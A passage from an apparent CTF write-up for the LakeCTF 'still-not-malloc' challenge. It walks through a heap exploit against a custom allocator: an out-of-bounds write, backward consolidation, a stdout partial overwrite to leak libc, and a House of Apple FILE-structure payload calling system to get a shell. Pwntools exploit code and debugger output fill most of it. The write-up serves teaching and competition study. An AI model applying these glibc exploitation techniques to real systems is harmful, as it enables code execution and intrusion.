+allocate a new snalloc chunk at. This gives us OOB write (without any leaks)
+over the heap region that lies after snab 2.
+
+Now that we have a powerful write primitive, we want to target the libc. Without
+any leaks, the only way we can target the libc is by placing the `main_arena{:c}`
+pointer of an unsorted chunk somewhere useful, such as the `next{:c}` pointer of
+a snab. Note that there aren't any checks on the validity of a snab on
+allocation, only on freeing, so we don't need to worry much about trying to
+forge a fake snab in libc.
+
+One way to achieve this primitive is by getting an unsorted chunk to consolidate
+past a snab, then use ptmalloc to align the remainder chunk with our snab's
+`next{:c}` pointer. To do this, we need to trigger a backwards consolidate.
+
+## Pivoting to libc
+
+The backwards consolidate required is quite tricky. Because of the unlink macro,
+we need to forge valid fd and bk pointers in our overhead chunk. The problem is
+that we don't have either heap leak or libc leak, so it will be difficult to
+forge these chunks. However, with a bit of feng shui, we can place a real
+unsorted overhead chunk before our victim snab (let's call it snab 3). Then,
+using snab 2, we can edit the size of the overhead chunk to align with the
+backwards consolidator, thereby claiming the entire region including snab 3.
+
+The setup for this feng shui is as follows: first, we page-align the top chunk
+by spraying ptmalloc chunks, then we allocate snab 3 via a snalloc, followed by
+the backward consolidator, and finally a guard chunk against the top chunk.
+
+```py
+# spray alignment chunks
+# 0xff0 = 0x11 * 0xf0
+for i in range(0x13, 0x13+0x11):
+    alloc(i, 0xe0)
+
+# allocate snab_3
+snalloc(0x21, 0xc0)
+
+# allocate unsorted chunk
+alloc(0x24, 0xe0)
+# and guard chunk
+alloc(0x25, 0x10)
+```
+
+Now, the heap will look like this:
+
+```ansi
+[22;1;32mpwndbg> [22;39mheap 0x55555557bff0
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557bff0 (snab 2)
+[39mSize: 0x3010 (with flag bits: 0x3011)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557f000
+[39mSize: 0xf0 (with flag bits: 0xf1)
+
+...
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557ff00 (overhead chunk)
+[39mSize: 0xf0 (with flag bits: 0xf1)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557fff0 (snab 3)
+[39mSize: 0x4010 (with flag bits: 0x4011)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555584000 (backwards consolidator)
+[39mSize: 0xf0 (with flag bits: 0xf1)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x5555555840f0 (guard chunk)
+[39mSize: 0x20 (with flag bits: 0x21)
+
+[31mTop chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555584110
+[39mSize: 0x15ef0 (with flag bits: 0x15ef1)[m
+```
+
+Next, we free 7 size-0xf0 chunks, filling up the tcache, and then free the
+overhead chunk, which will enter the unsorted bin and place the main_arena
+pointers at fd/bk. Then, using the OOB write primitive from snab 2, we overwrite
+the size of the overhead chunk and prev_size/size of the backwards consolidator,
+preparing the heap for consolidation.
+
+```py
+# fill 0xf0 tcache
+for i in range(0x13, 0x13+0x7):
+    free(i)
+
+# prepare the unsorted chunk (it might fall into smallbin but that's ok)
+free(0x13+0x10)
+
+# use snab_2 to edit prev_size and size of malloc[0x24]
+# offset = 0x1000 + ( ( (order + 1) * 0x1000 ) / 64 ) * idx
+# order  = ( ( (offset - 0x1000) / idx ) * 64 ) / 0x1000 - 1
+idx = 1
+offset = 0x8000
+order = ( ( (offset - 0x1000) // idx ) * 64 ) // 0x1000 - 1
+
+payload = flat(
+    0x0, # magic - not checked on alloc
+    0x2, # flags
+    order, # order
+    0x1, # bitmap
+    0x0, # prev
+    0x0, # next
+)
+snedit(0x10, payload)
+
+# now this chunk will be allocated on malloc[0x24]'s prev_size/size
+snalloc(0x22, 0x80)
+
+# use snalloc[0x22] to edit the prev_size and size of malloc[0x24]
+# dist between desired fake chunk and malloc[0x24] is 0x4100
+payload = flat(
+    0x4100, 0xf0
+)
+snedit(0x22, payload)
+
+# use snab_2 to prepare unsorted_chunk for consolidate
+# we fake its size
+idx = 1
+offset = 0x3f00
+order = ( ( (offset - 0x1000) // idx ) * 64 ) // 0x1000 - 1
+payload = flat(
+    0x0, # magic - not checked on alloc
+    0x2, # flags
+    order, # order
+    0x1, # bitmap
+    0x0, # prev
+    0x0, # next
+)
+snedit(0x10, payload)
+
+# this chunk will be allocated on unsorted chunk
+snalloc(0x23, 0x80)
+
+payload = flat(
+    0x0, # prev_size
+    0x4101, # size
+)
+snedit(0x23, payload)
+```
+
+Now, the heap is ready for the backwards consolidation.
+
+```ansi
+[22;1;32mpwndbg> [22;39mheap 0x55555557bff0
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557bff0 (snab 2)
+[39mSize: 0x3010 (with flag bits: 0x3011)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557f000
+[39mSize: 0xf0 (with flag bits: 0xf1)
+
+...
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557fe10
+[39mSize: 0xf0 (with flag bits: 0xf1)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555557ff00 (fake chunk spanning over snab 3)
+[39mSize: 0x4100 (with flag bits: 0x4101)
+
+[33mAllocated chunk
+[39mAddr: [34m0x555555584000 (backwards consolidator)
+[39mSize: 0xf0 (with flag bits: 0xf0)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x5555555840f0
+[39mSize: 0x20 (with flag bits: 0x21)
+
+[31mTop chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555584110
+[39mSize: 0x15ef0 (with flag bits: 0x15ef1)[m
+
+[22;1;32mpwndbg> [22;39mx/4gx 0x55555557ff00
+[34m0x55555557ff00[39m:	0x0000000000000000	0x0000000000004101
+[34m0x55555557ff10[39m:	0x00007ffff7fa9c00	0x00007ffff7fa9c00[m
+[22;1;32mpwndbg> [22;39mx/2gx 0x555555584000
+[34m0x555555584000[39m:	0x0000000000004100	0x00000000000000f0[m
+```
+
+Once we trigger the consolidate, we will have a unsorted chunk containing snab
+3. We must trim the unsorted chunk such that its fd/bk pointers lie on snab 3's
+prev/next pointers (in other words, start of unsorted lies on snab 3+0x10).
+
+This is the chunk before trimming:
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/38gx 0x55555557ff00
+[34m0x55555557ff00[39m:	0x0000000000000000	0x00000000000041f1
+[34m0x55555557ff10[39m:	0x00007ffff7fa9b20	0x00007ffff7fa9b20
+[34m0x55555557ff20[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff30[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff40[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff50[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff60[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff70[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff80[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff90[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffa0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffb0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffc0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffd0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffe0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557fff0[39m:	0x00000000000000f0	0x0000000000004010
+[34m0x555555580000[39m:	0x0000000555555580	0x0000000000000002
+[34m0x555555580010[39m:	0x0000000000000002	0x0000000000000001
+[34m0x555555580020[39m:	0x0000000000000000	0x0000000000000000[m
+[22;1;32mpwndbg> [22;39mp *(snab_t *)0x555555580000
+[36m$1[39m = {
+  [36mmagic[39m = 22906492288,
+  [36mflags[39m = 2,
+  [36morder[39m = 2,
+  [36mbitmap[39m = 1,
+  [36mprev[39m = [34m0x0[39m,
+  [36mnext[39m = [34m0x0
+[39m}[m
+```
+
+And this is the chunk after trimming:
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/38gx 0x55555557ff00
+[34m0x55555557ff00[39m:	0x0000000000000000	0x00000000000000c1
+[34m0x55555557ff10[39m:	0x00007ffff7faa230	0x00007ffff7faa230
+[34m0x55555557ff20[39m:	0x000055555557ff00	0x000055555557ff00
+[34m0x55555557ff30[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff40[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff50[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff60[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff70[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff80[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ff90[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffa0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffb0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557ffc0[39m:	0x0000000000000000	0x0000000000000051
+[34m0x55555557ffd0[39m:	0x00007ffff7fa9b20	0x00007ffff7fa9b20
+[34m0x55555557ffe0[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557fff0[39m:	0x00000000000000f0	0x0000000000004010
+[34m0x555555580000[39m:	0x0000000555555580	0x0000000000000002
+[34m0x555555580010[39m:	0x0000000000000002	0x00000000000040e1
+[34m0x555555580020[39m:	0x00007ffff7fa9b20	0x00007ffff7fa9b20[m
+[22;1;32mpwndbg> [22;39mp *(snab_t *)0x555555580000
+[36m$1[39m = {
+  [36mmagic[39m = 22906492288,
+  [36mflags[39m = 2,
+  [36morder[39m = 2,
+  [36mbitmap[39m = 16609,
+  [36mprev[39m = [34m0x7ffff7fa9b20[39m <[33mmain_arena[39m+96>,
+  [36mnext[39m = [34m0x7ffff7fa9b20[39m <[33mmain_arena[39m+96>
+}[m
+```
+
+## Getting our leak (finally)
+
+Although the next snab is now in libc region, it's too near to the stdout struct.
+We need it to be at least 1 page away from stdout in order to actually write to
+stdout. 
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel &_IO_2_1_stdout_ 
+00:0000│  [35m0x7ffff7faa5c0 (_IO_2_1_stdout_)[39m ◂— 0xfbad2887
+01:0008│  [35m0x7ffff7faa5c8 (_IO_2_1_stdout_+8)[39m —▸ [35m0x7ffff7faa643 (_IO_2_1_stdout_+131)[39m ◂— 0xfab790000000000a /* '\n' */
+... ↓     6 skipped
+[22;1;32mpwndbg> [22;39mdist 0x7ffff7fa9b20 0x7ffff7faa5c0
+0x7ffff7fa9b20->0x7ffff7faa5c0 is 0xaa0 bytes (0x154 words)[m
+```
+
+To fix this, we can perform a partial overwrite on the next pointer, but this
+will incur a 1/16 chance of success. In addition to the partial overwrite, we
+also need to set bitmap to 0xffffffffffffffff so we can allocate a snalloc chunk
+in the next snab.
+
+```py
+idx = 1
+offset = 0x4000
+order = ( ( (offset - 0x1000) // idx ) * 64 ) // 0x1000 - 1
+payload = flat(
+    0x0, # magic - not checked on alloc
+    0x2, # flags
+    order, # order
+    0x1, # bitmap
+    0x0, # prev
+    0x0, # next
+)
+snedit(0x10, payload)
+
+# allocated on snab_3
+snalloc(0x24, 0x80)
+
+# edit snab_3->next so it points exactly 0x1000 before stdout->_IO_write_ptr
+# that value is possibly 0x7ffff7faa5e8 - 1/16 chance!
+payload = flat(
+    0x0, # magic
+    0x2, # flags
+    0x2, # order
+    0xffffffffffffffff, # bitmap
+    0x0, # prev
+    b"\xe8\x95" # partial overwrite next
+)
+snedit(0x24, payload)
+```
+
+The area we chose also has the bitmap set to 0, so the very first chunk we
+snalloc will fall directly on `_IO_2_1_stdout_->_IO_write_ptr{:c}`.
+
+```ansi
+[22;1;32mpwndbg> [22;39mp *(snab_t *)0x555555580000
+[36m$2[39m = {
+  [36mmagic[39m = 0,
+  [36mflags[39m = 2,
+  [36morder[39m = 2,
+  [36mbitmap[39m = 18446744073709551615,
+  [36mprev[39m = [34m0x0[39m,
+  [36mnext[39m = [34m0x7ffff7fa95e8[39m <[33mbuiltin_modules[39m+584>
+}[m
+[22;1;32mpwndbg> [22;39mp *((snab_t *)0x555555580000)->next
+[36m$3[39m = {
+  [36mmagic[39m = 140737353419041,
+  [36mflags[39m = 0,
+  [36morder[39m = 0,
+  [36mbitmap[39m = 0,
+  [36mprev[39m = [34m0x7ffff7f508c8[39m,
+  [36mnext[39m = [34m0x7ffff7f50914
+[39m}[m
+[22;1;32mpwndbg> [22;39mtel 0x7ffff7fa95e8+0x1000
+00:0000│  [35m0x7ffff7faa5e8 (_IO_2_1_stdout_+40)[39m —▸ [35m0x7ffff7faa643 (_IO_2_1_stdout_+131)[39m ◂— 0xfab790000000000a /* '\n' */
+... ↓     2 skipped
+03:0018│  [35m0x7ffff7faa600 (_IO_2_1_stdout_+64)[39m —▸ [35m0x7ffff7faa644 (_IO_2_1_stdout_+132)[39m ◂— 0xf7fab79000000000
+04:0020│  [35m0x7ffff7faa608 (_IO_2_1_stdout_+72)[39m ◂— 0
+... ↓     3 skipped[m
+```
+
+
+The reason why we choose to write directly to `_IO_write_ptr{:c}` is because
+that's the only pointer we need to set - the rest are already appropriately set.
+And we can only afford to partially overwrite this pointer, to prevent the
+program from crashing when it tries to print the leak. For our leak, we will
+increase the value of `_IO_write_ptr{:c}` by 0x1000, which will print out
+everything between `_IO_write_base{:c}` and `_IO_write_ptr{:c}`, granting us our
+libc leak.
+
+```ansi
+[36m$[39m python3 solve.py LOCAL GDB
+[39m[[22;1;34m*[22;39m] '/home/samuzora/ctf/current/lakectf/still-not-malloc/solve/chal'
+    Arch:       amd64-64-little
+    RELRO:      [32mFull RELRO
+[39m    Stack:      [31mNo canary found
+[39m    NX:         [32mNX enabled
+[39m    PIE:        [32mPIE enabled
+[39m    Stripped:   [31mNo
+[39m    Debuginfo:  [31mYes
+[39m[[22;1;34m*[22;39m] '/home/samuzora/ctf/current/lakectf/still-not-malloc/solve/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      [32mFull RELRO
+[39m    Stack:      [32mCanary found
+[39m    NX:         [32mNX enabled
+[39m    PIE:        [32mPIE enabled
+[39m    SHSTK:      [32mEnabled
+[39m    IBT:        [32mEnabled
+[39m    Stripped:   [31mNo
+[39m    Debuginfo:  [31mYes
+[39m[[22;1;32m+[22;39m] Opening connection to localhost on port 6019: Done
+[[22;1;34m*[22;39m] Paused (press any to continue)
+[[22;1;34m*[22;39m] Switching to interactive mode
+ 
+\x00\x00\x00\x00\x90\xb7\xfa\xf7\xff\x7f\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x97\xfa\xf7\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xa5\xfa\xf7\xff\x7f\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\xd2=\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x80\xfa\xf7\xff\x7f\x00\x00\xe0\xa4\xfa\xf7\xff\x7f\x00\x00\xc0\xa5\xfa\xf7\xff\x7f\x00\x00\xe0\x98\xfa\xf7\xff\x7f\x00\x00\x00\xd0\xff\xf7\xff\x7f\x00\x00\xa0x\xdc\xf7\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\xee\xff\xff\xff\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[m
+```
+
+## House of Apple
+
+With our libc leak, we are finally ready to get RCE! We first reposition the
+fake snab to somewhere before `_IO_2_1_stderr_{:c}`, ensuring that our chunks
+will align properly with what we want to write. It is important that the fake
+snab location we choose contains 0x0 for the bitmap, because without that we
+can't easily control the allocation address. It's likely that the fake snab
+position we choose will also contain 0x0 for the order, so our chunk offsets
+will increase by 0x40 each time. However, the write size is still 0xc0 as it is
+not determined by the snab order.
+
+After looking for such a place to fake a snab, we might find one at
+`_IO_2_1_stderr_-0x1240{:c}`. We can allocate the padding chunks accordingly and
+obtain a 2-part write over the file via 2 size-0xc0 snalloc chunks. With this,
+we can write the modified House of Apple payload to trigger on printing to
+stderr, getting a shell!
+
+```py
+# edit snab_3->next so it points exactly 0x1000 and some before stderr
+# criteria for choosing the start:
+# order and bitmap must be zero, and should be a multiple of 0x40 from the desired write
+# that area is libc.address + 0x2092a0
+# pwndbg> x/32gx 0x7ffff7fa92a0
+# 0x7ffff7fa92a0 <_gmonparam+32>:	0x0000000000000000	0x0000000000000000
+# 0x7ffff7fa92b0 <_gmonparam+48>:	0x0000000000000000	0x0000000000000000
+# 0x7ffff7fa92c0 <_gmonparam+64>:	0x0000000000000000	0x0000000000000000
+payload = flat(
+    0x0, # magic
+    0x2, # flags
+    0x2, # order
+    0xffffffffffffffff, # bitmap
+    0x0, # prev
+    libc.address + 0x2092a0
+)
+snedit(0x24, payload)
+
+# chosen value is 0x1000 + 0x40*9 before stderr
+for i in range(0x9):
+    snalloc(0x25, 0xc0)
+
+snalloc(0x25, 0xc0) # 0x00
+
+# 0xc0 = 0x40 * 3
+for i in range(3):
+    snalloc(0x26, 0xc0)
+
+payload = flat({
+    0x00: b"  sh",
+    0x20: 0x0,
+    0x28: 0x1,
+    0x88: libc.sym._IO_stdfile_1_lock,
+    0xa0: libc.sym._IO_2_1_stderr_-0x10,
+    0xc0: 0x0,
+    0xd8: libc.sym._IO_wfile_jumps-0x20,
+ 
+    0x18 - 0x10: 0x0,
+    0x30 - 0x10: 0x0, # redundant - 0x20 is already set
+    0xe0 - 0x10: libc.sym._IO_2_1_stderr_,
+ 
+    0x68: libc.sym.system
+}, filler=b"\x00")
+
+snedit(0x25, payload[:0xc0])
+snedit(0x26, payload[0xc0:])
+
+# trigger print to stderr
+snfree(0x24)
+```
+
+```ansi
+[36m$[39m python3 solve.py LOCAL    
+[39m[[22;1;34m*[22;39m] '/home/samuzora/ctf/current/lakectf/still-not-malloc/solve/chal'
+    Arch:       amd64-64-little
+    RELRO:      [32mFull RELRO
+[39m    Stack:      [31mNo canary found
+[39m    NX:         [32mNX enabled
+[39m    PIE:        [32mPIE enabled
+[39m    Stripped:   [31mNo
+[39m    Debuginfo:  [31mYes
+[39m[[22;1;34m*[22;39m] '/home/samuzora/ctf/current/lakectf/still-not-malloc/solve/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      [32mFull RELRO
+[39m    Stack:      [32mCanary found
+[39m    NX:         [32mNX enabled
+[39m    PIE:        [32mPIE enabled
+[39m    SHSTK:      [32mEnabled
+[39m    IBT:        [32mEnabled
+[39m    Stripped:   [31mNo
+[39m    Debuginfo:  [31mYes
+[39m[[22;1;32m+[22;39m] Opening connection to localhost on port 6019: Done
+libc.address = 7ffff7da0000
+[[22;1;34m*[22;39m] Switching to interactive mode
+ [22;1;31m$[22;39m ls
+flag.txt
+run
+[22;1;31m$[22;39m cat flag.txt
+EPFL{ST1LL_NOT_MALLOC_ST1LL_BU99Y_ST1LL_P4IN}[m
+```
+
+
